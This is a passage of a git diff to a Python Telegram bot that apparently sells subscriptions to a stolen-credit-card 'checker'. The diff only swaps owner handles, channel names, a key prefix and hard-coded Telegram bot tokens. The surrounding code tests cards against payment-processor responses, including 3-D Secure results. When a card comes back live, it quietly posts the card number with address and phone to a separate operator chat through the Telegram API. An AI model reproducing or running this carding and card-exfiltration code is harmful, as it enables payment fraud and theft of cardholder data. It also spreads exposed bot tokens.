 ''',reply_markup=keyboard)
 		return
 	current_time = datetime.now()
 	required_duration = timedelta(hours=0)
 	if current_time - provided_time > required_duration:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>لا يمكنك استخدام البوت بسبب انتهاء اشتراكك يرجى التواصل مع المالك للتفعل مرى اخرى</b>
 	''',reply_markup=keyboard)
@@ -981,7 +981,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
 ⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
 ⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
-⸙ 𝗕𝗼𝘁 𝗕𝘆: @wwpww6</b>'''
+⸙ 𝗕𝗼𝘁 𝗕𝘆: @FJ0FF</b>'''
 	msgd=f'''<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ❌
 			
 ⸙ 𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
@@ -991,9 +991,9 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ⸙ 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ {country} - {country_flag} 
 ⸙ 𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
 ⸙ 𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
-⸙ 𝗕𝗼𝘁 𝗕𝘆: @wwpww6</b>'''
+⸙ 𝗕𝗼𝘁 𝗕𝘆: @FJ0FF</b>'''
 	if "Funds" in last or 'Insufficient Funds' in last or 'avs' in last or '1000: Approved' in last or 'Duplicate' in last or 'Approved' in last:
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acc =  '-889876060'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -1004,12 +1004,12 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @reeetere
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @wwpww6  
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @mmqxq
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @FJ0FF  
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acb =  '-889876060'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1046,8 +1046,8 @@ def respond_to_vbv(message):
 		BL='𝗙𝗥𝗘𝗘'
 	if BL == '𝗙𝗥𝗘𝗘':
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
 عذرا هذا البوت ليس مجانا 
@@ -1059,7 +1059,7 @@ def respond_to_vbv(message):
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -1069,8 +1069,8 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b>
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b>
 ''',reply_markup=keyboard)
 		return
 	with open('data.json', 'r') as file:
@@ -1080,8 +1080,8 @@ User Bot : @wwpww6 {BL}</b>
 		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
 	except Exception as e:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
 عذرا هذا البوت ليس مجانا 
@@ -1093,7 +1093,7 @@ User Bot : @wwpww6 {BL}</b>
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -1103,16 +1103,16 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b>
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b>
 ''',reply_markup=keyboard)
 		return
 	current_time = datetime.now()
 	required_duration = timedelta(hours=0)
 	if current_time - provided_time > required_duration:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>لا يمكنك استخدام البوت بسبب انتهاء اشتراكك يرجى التواصل مع المالك للتفعل مرى اخرى</b>
 	''',reply_markup=keyboard)
@@ -1186,7 +1186,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @wwpww6
+◆ 𝑩𝒀: @FJ0FF
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	msg=f'''<b>𝑪𝑯𝑨𝑹𝑮𝑬 ✅
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -1198,7 +1198,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @wwpww6
+◆ 𝑩𝒀: @FJ0FF
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	msgc=f'''<b>𝑪𝑪𝑵 ☑️
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -1210,7 +1210,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @wwpww6
+◆ 𝑩𝒀: @FJ0FF
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	msgf=f'''<b>𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 𝑭𝑼𝑵𝑫𝑺 ☑️
 			- - - - - - - - - - - - - - - - - - - - - - -
@@ -1222,10 +1222,10 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @wwpww6
+◆ 𝑩𝒀: @FJ0FF
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if 'success' in last:
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acc =  '-889876060'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -1236,12 +1236,12 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @reeetere
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @wwpww6  
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @FJ0FF  
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acb =  '-889876060'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1252,7 +1252,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 		i = requests.post(tlg, params=tlg_params)
 		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
 	elif "funds" in last:
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acc =  '-889876060'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -1263,12 +1263,12 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @reeetere
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @wwpww6  
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @FJ0FF  
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acb =  '-889876060'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1279,7 +1279,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 		i = requests.post(tlg, params=tlg_params)
 		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgf)
 	elif "card's security" in last:
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acc =  '--889876060'
 		mg = f"""<b> 
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
@@ -1290,12 +1290,12 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ｢𝙱𝙰𝙽𝙺」➔ {bank}
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
 ❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @reeetere
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @wwpww6  
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @FJ0FF  
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acb =  '-889876060'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
@@ -1345,7 +1345,7 @@ def start(message):
 			with open('data.json', 'r') as json_file:
 				existing_data = json.load(json_file)
 			characters = string.ascii_uppercase + string.digits
-			pas ='ZXC-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
+			pas ='TOME-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
 			current_time = datetime.now()
 			ig = current_time + timedelta(hours=h)
 			plan='𝗩𝗜𝗣'
@@ -1369,7 +1369,7 @@ EXPIRES IN ➜ {ig}
 KEY ➜ <code>{pas}</code>
 		
 USE /redeem + [KEY]
-User Bot : @wwpww6
+User Bot : @TomeCheckerBot
 </b>'''
 			bot.reply_to(message,msg,parse_mode="HTML")
 		except Exception as e:
@@ -1400,8 +1400,8 @@ def respond_to_vbv(message):
 			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
 	if BL == '𝗙𝗥𝗘𝗘':
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
 عذرا هذا البوت ليس مجانا 
@@ -1413,7 +1413,7 @@ def respond_to_vbv(message):
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -1423,8 +1423,8 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b>
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b>
 ''',reply_markup=keyboard)
 		return
 	with open('data.json', 'r') as file:
@@ -1434,8 +1434,8 @@ User Bot : @wwpww6 {BL}</b>
 		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
 	except Exception as e:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>مرحبا {name}
 عذرا هذا البوت ليس مجانا 
@@ -1447,7 +1447,7 @@ User Bot : @wwpww6 {BL}</b>
 اسبوع : 9 اسيا
 شهر : 18 اسيا
 
-للشراء عن طريق اسياسيل من هنا : @wwpww6
+للشراء عن طريق اسياسيل من هنا : @FJ0FF
 
 Subscription to the bot prices is now available: 
   
@@ -1457,16 +1457,16 @@ day : 2 USDT
 week : 6 USDT 
 Month : 12 USDT
 
-To purchase via USDT from here : @wwpww6
-User Bot : @wwpww6 {BL}</b>
+To purchase via USDT from here : @FJ0FF
+User Bot : @TomeCheckerBot {BL}</b>
 ''',reply_markup=keyboard)
 		return
 	current_time = datetime.now()
 	required_duration = timedelta(hours=0)
 	if current_time - provided_time > required_duration:
 		keyboard = types.InlineKeyboardMarkup()
-		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/wwpww6")
-		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/reeetere")
+		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/FJ0FF")
+		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/mmqxq")
 		keyboard.add(contact_button, ahmed)
 		bot.send_message(chat_id=message.chat.id, text=f'''<b>لا يمكنك استخدام البوت بسبب انتهاء اشتراكك يرجى التواصل مع المالك للتفعل مرى اخرى</b>
 	''',reply_markup=keyboard)
@@ -1531,7 +1531,7 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @wwpww6
+◆ 𝑩𝒀: @FJ0FF
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
 - - - - - - - - - - - - - - - - - - - - - - -
@@ -1543,10 +1543,10 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ◆ 𝑩𝑨𝑵𝑲 ➜ <code>{bank}</code>
 ◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
 - - - - - - - - - - - - - - - - - - - - - - -
-◆ 𝑩𝒀: @wwpww6
+◆ 𝑩𝒀: @FJ0FF
 ◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
 	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acc =  '-889876060'
 		mg = f"""<b> 
 ❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
@@ -1557,12 +1557,12 @@ Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
 ｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
 ｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ <code>{country} - {country_flag}</code>
 ❆═══𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁═══❆
-✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @reeetere
-✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @wwpww6  
+✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
+✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @FJ0FF  
 </b>"""
 		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
 		tlg_params = {"parse_mode": "HTML"}
-		tok = '7977702008:AAF5NvzjKdYhoV7Z2zo3L2XMQW6JFFABrdE'
+		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
 		acb =  '-889876060'
 		mag = f"""<b>
 {cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
